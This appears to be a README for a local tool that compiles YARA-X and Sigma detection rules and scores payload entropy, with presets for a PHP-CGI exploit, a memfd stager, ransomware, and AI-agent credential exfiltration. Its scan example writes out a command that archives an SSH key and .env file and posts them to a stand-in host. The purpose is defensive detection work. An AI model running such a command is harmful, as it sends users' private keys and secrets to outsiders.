---
tool_id: yara-sigma-forge
name: YARA-X & Sigma Threat Rule Forge
category: Security & Recon
port: 8133
version: 3.3.0
status: Verified
access: 100% Free & Open Access (Zero Paywalls)
stripe_coffee: https://buy.stripe.com/3cIfZg27PdKo2D64Ocfw40X
solana_tip: GG2eQbVh8ut1BK6j1A2tz7pSySdLpD38BgyEhGcxdXoK
---

# YARA-X & Sigma Threat Rule Forge (`yara-sigma-forge`)

> **Sovereign In-Browser YARA-X & Sigma Threat Detection Rule Compiler, 60fps Byte-Offset Shannon Entropy Radar & MITRE ATT&CK Mapper**
> - **Standalone Workstation**: `http://127.0.0.1:8133`
> - **Zoth Studio v2 God-Mode**: `http://127.0.0.1:3000/tools/yara-sigma-forge`
> - **Global ZothOS CLI**: `/home/zoth/.local/bin/yara-sigma-forge` (`/usr/local/bin/yara-sigma-forge`)
> - **100% Open-Access Support**: [☕ Buy Us a Coffee (Stripe)](https://buy.stripe.com/3cIfZg27PdKo2D64Ocfw40X) · ◎ Solana Tip: `GG2eQbVh8ut1BK6j1A2tz7pSySdLpD38BgyEhGcxdXoK`

---

## Part I — Developer Architecture, Automated Test Suite & API Contracts

### Step 01 · Repository Architecture & Threat Signature Engine (`server.py`)
Developers inspecting `/home/zoth/NullAITech/yara-sigma-forge` can examine the zero-dependency threat rule server (`server.py`), the standalone workstation (`public/index.html`), the 4 sovereign threat signature presets (`php-cgi-rce`, `agent-exfil-trap`, `elf-shellcode-stager`, `ransomware-shadow-copy`), and the `shannon_entropy()` rolling byte-stream analyzer.

![[Studio/Tools/Artifacts/yara-sigma-forge/yara-sigma-forge_01_dev_repo_architecture.jpg]]

### Step 02 · Automated Pytest Suite (`pytest -v`)
Running `pytest -v` executes `tests/test_yara_sigma_forge.py`, verifying Shannon entropy mathematical bounds (`0.00` to `8.00`), MITRE ATT&CK technique mappings across all 4 threat rules, and live HTTP endpoints (`/health`, `/api/presets`, `POST /api/scan`).

![[Studio/Tools/Artifacts/yara-sigma-forge/yara-sigma-forge_02_dev_pytest_suite.jpg]]

### Step 03 · REST API & Multi-Rule Threat Scanner Contract (`:8133`)
Developers integrating with `:8133` can query `GET /health` and submit raw byte payloads or HTTP requests to `POST /api/scan` to receive instant Shannon entropy scoring, byte length, overall `SUSPICIOUS` / `CLEAN` verdict, and per-rule pattern match breakdowns.

![[Studio/Tools/Artifacts/yara-sigma-forge/yara-sigma-forge_03_dev_api_mcp_contracts.jpg]]

---

## Part II — End-User ZothOS CLI Installation & Terminal Workflows

### Step 04 · Global ZothOS CLI Installation, Help Contract & Enclave Status
End-users invoke `yara-sigma-forge` from anywhere in ZothOS to inspect CLI flags (`--compile {yara,sigma}`, `--preset`, `--scan`, `--entropy`, `--status`, `--json`) and verify the local `:8133` enclave daemon.

![[Studio/Tools/Artifacts/yara-sigma-forge/yara-sigma-forge_04_user_cli_help_install.jpg]]

### Step 05 · CLI Workflow A — Compiling Production YARA-X (`.yar`) & Sigma YAML (`.yml`) Rules
Running `yara-sigma-forge --compile yara --preset php-cgi-rce` emits the complete `ZOTH_PHP_CGI_Arg_Injection_RCE` YARA-X rule for CVE-2024-4577, while `yara-sigma-forge --compile sigma --preset agent-exfil-trap` emits a production Sigma SIEM rule for AI Agent Prompt-to-Shell Credential Exfiltration.

![[Studio/Tools/Artifacts/yara-sigma-forge/yara-sigma-forge_05_user_cli_workflow_a.jpg]]

### Step 06 · CLI Workflow B — Payload Threat Scanning & Shannon Entropy Calculation
Running `yara-sigma-forge --scan "tar -czf - ~/.ssh/id_ed25519 ./config/.env | base64 -w0 | curl -X POST https://collector.example/drop -d @-" --json` flags `ZOTH_Agent_MCP_Credential_Exfil` (`$env_file`, `$ssh_key`, `$base64_exfil` matched), and `--entropy` computes the exact Shannon entropy (`4.84 / 8.00`) of an ELF64 `memfd_create` stager.

![[Studio/Tools/Artifacts/yara-sigma-forge/yara-sigma-forge_06_user_cli_workflow_b.jpg]]

---

## Part III — Standalone Web Workstation (`:8133`), Zoth Studio God-Mode (`:3000`) & Responsive Verification

### Step 07 · Standalone Web Workstation (`http://127.0.0.1:8133`) — Dark Mode Home & Entropy Radar
Opening `http://127.0.0.1:8133` launches the **YARA-X & Sigma Threat Rule Forge** workstation in Dark Mode, showing the live **Byte-Offset Shannon Entropy Profile** canvas (`AVG SHANNON: 5.27`, `PEAK: 4.40`, `5 / 5 PATTERN MATCHES`), the raw CVE-2024-4577 payload buffer, and the compiled `ZOTH_PHP_CGI_Arg_Injection_RCE` YARA-X rule.

![[Studio/Tools/Artifacts/yara-sigma-forge/yara-sigma-forge_07_gui_standalone_dark_home.jpg]]

### Step 08 · Standalone Web Workstation — ELF64 Memfd Stager & Sigma YAML (`.yml`) Tab
Selecting the **ELF64 Memfd Reflective Stager** preset and switching to **Sigma YAML (.yml)** updates the rolling byte-offset entropy radar (`4.83 H`, `184 B`, `3 / 4 PATTERN MATCHES`) and compiles the corresponding Sigma detection rule with `attack.t1620` and `attack.t1027` tags.

![[Studio/Tools/Artifacts/yara-sigma-forge/yara-sigma-forge_08_gui_standalone_interactive_a.jpg]]

### Step 09 · Standalone Web Workstation — AI Agent Exfil, MITRE ATT&CK Matrix & Editorial Light Mode
Selecting **AI Agent Prompt-to-Shell Credential Exfil**, switching to **MITRE ATT&CK Matrix** (`T1552.001`, `T1048`), and toggling **☀️ Light Mode** transitions the workstation to warm alabaster (`#F8F6F0`) with high-contrast dark ink (`#181612`).

![[Studio/Tools/Artifacts/yara-sigma-forge/yara-sigma-forge_09_gui_standalone_interactive_b.jpg]]

### Step 10 · Zoth Studio v2 God-Mode Workbench (`http://127.0.0.1:3000/tools/yara-sigma-forge`) — Overview
Inside Zoth Studio v2 (`:3000`), the YARA-X & Sigma Threat Rule Forge overview provides local `:8133` enclave controls, CLI quick-launch commands, and 100% open-access Stripe/Solana support rails.

![[Studio/Tools/Artifacts/yara-sigma-forge/yara-sigma-forge_10_gui_studio_godmode_overview.jpg]]

### Step 11 · Zoth Studio v2 God-Mode Workbench — Interactive Enclave Workstation & 60fps Byte-Stream Spectrum
Scrolling to the **Interactive Enclave Workstation** reveals the U+2800 Braille / Bayer 8x8 dither canvas and the live **60FPS Byte-Stream Entropy & Signature Offset Spectrum** (`RULE TRIGGERED 5/5 PATTERNS`, `T1190`, `T1059.004`).

![[Studio/Tools/Artifacts/yara-sigma-forge/yara-sigma-forge_11_gui_studio_godmode_interactive.jpg]]

### Step 12 · Mobile `390x844` Responsive Verification (`overflowPx === 0`)
Verified at `390x844` mobile viewport (`scrollWidth: 390, clientWidth: 390, overflowPx: 0`) with stacked responsive Bento panes, wrapped header controls, and zero horizontal overflow.

![[Studio/Tools/Artifacts/yara-sigma-forge/yara-sigma-forge_12_gui_mobile_390px.jpg]]
